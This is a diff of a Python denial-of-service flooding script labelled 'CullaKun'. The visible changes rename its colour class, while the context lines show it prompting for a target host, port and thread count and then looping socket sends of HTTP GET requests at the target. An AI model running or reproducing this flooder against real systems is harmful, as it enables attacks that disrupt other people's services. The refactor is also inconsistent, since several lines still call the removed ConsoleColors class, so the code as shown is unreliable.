@@ -11,7 +11,7 @@ os.system("clear")
 if not __name__ == "__main__":
     exit()
       
-class ConsoleColors:
+class Colors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKGREEN = '\033[92m'
@@ -19,7 +19,7 @@ class ConsoleColors:
     FAIL = '\033[91m'
     BOLD = '\033[1m'
     
-print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
+print(Colors.BOLD + ConsoleColors.WARNING + '''
 Banner 
 
          
@@ -27,16 +27,16 @@ Banner
     
 def getport():
     try:
-        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "╰─> Port:\r\n"))
+        p = int(input(Colors.BOLD + Colors.OKGREEN + "╰─> Port:\r\n"))
         return p
     except ValueError:
-        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
+        print(Colors.BOLD + Colors.WARNING + "ERROR Port must be a number, Set Port to default " + Colors.OKGREEN + "80")
         return 80
-print(ConsoleColors.BOLD + "╭──[CullaKun]──⬣")
-host = input(ConsoleColors.BOLD + ConsoleColors.BOLD + "╰─> Host:\r\n")
+print(Colors.BOLD + "╭──[CullaKun]──⬣")
+host = input(Colors.BOLD + Colors.BOLD + "╰─> Host:\r\n")
 port = getport()
-speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.BOLD + "╰─> Hits Running:\r\n"))
-threads = int(input(ConsoleColors.BOLD + ConsoleColors.BOLD + "╰─> Thread Count:\r\n"))
+speedPerRun = int(input(Colors.BOLD + Colors.BOLD + "╰─> Hits Running:\r\n"))
+threads = int(input(Colors.BOLD + Colors.BOLD + "╰─> Thread Count:\r\n"))
 
 ip = socket.gethostbyname(host)
 
@@ -59,22 +59,22 @@ def goForDosThatThing():
                     try:
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Sent the packet" + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + "successful: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + "> ")
+                        print(Colors.BOLD + Colors.OKGREEN + "Sent the packet" + Colors.FAIL + str(Count.packetCounter) + Colors.OKGREEN + "successful: " + Colors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "> ")
                         Count.packetCounter = Count.packetCounter + 1
                     except socket.error:
-                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
+                        print(Colors.WARNING + "ERROR, Maybe the host is down?!?!")
                     except KeyboardInterrupt:
-                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+                        print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
             except socket.error:
-                print(ConsoleColors.WARNING + "Server error, Please check the host!")
+                print(Colors.WARNING + "Server error, Please check the host!")
             except KeyboardInterrupt:
-                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+                print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
             dosSocket.close()
     except KeyboardInterrupt:
-        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+        print(Colors.BOLD + Colors.FAIL + "\r\n[-] Canceled by user")
 try:
         
-    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
+    print(Colors.BOLD + Colors.OKBLUE + '''
     Banner                                                                  
           ''')
     print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [     1] 0% ")
